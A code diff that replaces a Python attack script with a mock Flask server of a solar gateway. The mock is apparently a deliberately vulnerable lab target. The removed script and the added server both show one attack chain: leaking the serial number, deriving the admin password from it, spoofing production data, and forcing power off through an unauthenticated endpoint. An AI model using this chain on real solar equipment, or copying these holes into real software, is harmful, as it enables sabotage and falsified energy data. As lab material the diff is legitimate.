@@ -1,52 +1,121 @@
-import requests
+from flask import Flask, request, jsonify
 import hashlib
+from datetime import datetime
 
-TARGET = "http://localhost:5000"
+app = Flask(__name__)
 
-# Step 1: Leak serial number
-resp = requests.get(f"{TARGET}/api/device_info")
-serial = resp.json()["serial_number"]
-print(f"[+] Serial number leaked: {serial}")
+# Mock internal state
+device_state = {
+    "serial_number": "1234567890ENPH",
+    "firmware_version": "R5.10.65",
+    "model": "Envoy-S Metered",
+    "production_kw": 5.3,
+    "auth_token": None,
+    "inverters": [
+        {"serial": "121715003401", "last_report_date": datetime.now().isoformat(), "watt": 270},
+        {"serial": "121715003402", "last_report_date": datetime.now().isoformat(), "watt": 265}
+    ]
+}
 
-# Step 2: Generate password from serial
+# Utility Functions
+
 def generate_password(serial):
-    return hashlib.sha256(serial.encode()).hexdigest()[:8]
+    hash_obj = hashlib.sha256(serial.encode())
+    return hash_obj.hexdigest()[:8]
 
-password = generate_password(serial)
-print(f"[+] Derived password: {password}")
+def is_authed(req):
+    return req.headers.get("Authorization") == device_state["auth_token"]
 
-# Step 3: Log in using generated password
-login_resp = requests.post(f"{TARGET}/api/login", json={
-    "username": "admin",
-    "password": password
-})
-if login_resp.status_code != 200:
-    print("[-] Login failed")
-    exit(1)
+# API Endpoints
 
-token = login_resp.json()["token"]
-print(f"[+] Auth token received: {token}")
+# /info (public)
+@app.route("/info", methods=["GET"])
+def info():
+    return jsonify({
+        "serial_number": device_state["serial_number"],
+        "model": device_state["model"],
+        "software": device_state["firmware_version"]
+    })
 
-# Step 4: Spoof production data
-spoof_resp = requests.post(f"{TARGET}/api/fake_production",
-                           headers={"Authorization": token},
-                           json={"production_kw": 9999.99})
+# /api/v1/production (public)
+@app.route("/api/v1/production", methods=["GET"])
+def prod():
+    return jsonify({
+        "wattHoursToday": 21340,
+        "wattHoursSevenDays": 154340,
+        "wattHoursLifetime": 11200342,
+        "wattsNow": int(device_state["production_kw"] * 1000)
+    })
 
-if spoof_resp.status_code == 200:
-    print(f"[+] Successfully spoofed production data.")
-else:
-    print(f"[-] Failed to spoof data: {spoof_resp.json()}")
+# /api/v1/production/inverters (requires auth)
+@app.route("/api/v1/production/inverters", methods=["GET"])
+def inverter_stats():
+    if not is_authed(request):
+        return jsonify({"error": "Unauthorized"}), 401
+    return jsonify(device_state["inverters"])
+
+# /api/v1/devices (requires auth)
+@app.route("/api/v1/devices", methods=["GET"])
+def devices():
+    if not is_authed(request):
+        return jsonify({"error": "Unauthorized"}), 401
+    return jsonify([
+        {
+            "type": "PCU",
+            "serialNumber": inv["serial"],
+            "producing": True,
+            "lastReportWatts": inv["watt"],
+            "lastReportDate": inv["last_report_date"]
+        }
+        for inv in device_state["inverters"]
+    ])
+
+# /api/login (insecure custom logic)
+@app.route("/api/login", methods=["POST"])
+def login():
+    data = request.json
+    user = data.get("username")
+    password = data.get("password")
+    if user == "admin":
+        expected = generate_password(device_state["serial_number"])
+        if password == expected:
+            device_state["auth_token"] = "authtok_" + expected
+            return jsonify({"token": device_state["auth_token"]})
+    return jsonify({"error": "Access denied"}), 403
+
+# Spoof production (simulates attacker success)
+@app.route("/api/spoof", methods=["POST"])
+def spoof():
+    if not is_authed(request):
+        return jsonify({"error": "Unauthorized"}), 401
+    data = request.json
+    if "production_kw" in data:
+        device_state["production_kw"] = float(data["production_kw"])
+        return jsonify({"message": "Production spoofed."})
+    return jsonify({"error": "Missing value"}), 400
     
-# Step 5: Check power state (unauthenticated)
-print("[*] Checking current power state...")
-resp = requests.get(f"{TARGET}/ivp/mod/603980032/mode/power")
-print(resp.json())
+# Simulated hardcoded device ID
+DEVICE_ID = "603980032"
 
-# Step 6: Disable production (unauthenticated)
-print("[*] Disabling power production...")
-resp = requests.post(f"{TARGET}/ivp/mod/603980032/mode/power", json={"powerForcedOff": True})
-print(resp.json())
+# Power state variable
+device_state["powerForcedOff"] = False
 
-# Step 7: Confirm state changed
-resp = requests.get(f"{TARGET}/ivp/mod/603980032/mode/power")
-print(resp.json())
+@app.route(f"/ivp/mod/{DEVICE_ID}/mode/power", methods=["GET"])
+def get_power_state():
+    return jsonify({
+        "powerForcedOff": device_state["powerForcedOff"]
+    })
+
+@app.route(f"/ivp/mod/{DEVICE_ID}/mode/power", methods=["POST"])
+def set_power_state():
+    data = request.json
+    forced_off = data.get("powerForcedOff")
+    if isinstance(forced_off, bool):
+        device_state["powerForcedOff"] = forced_off
+        return jsonify({
+            "message": f"Power state updated. Forced off: {forced_off}"
+        })
+    return jsonify({"error": "Invalid or missing parameter"}), 400
+
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=5000)
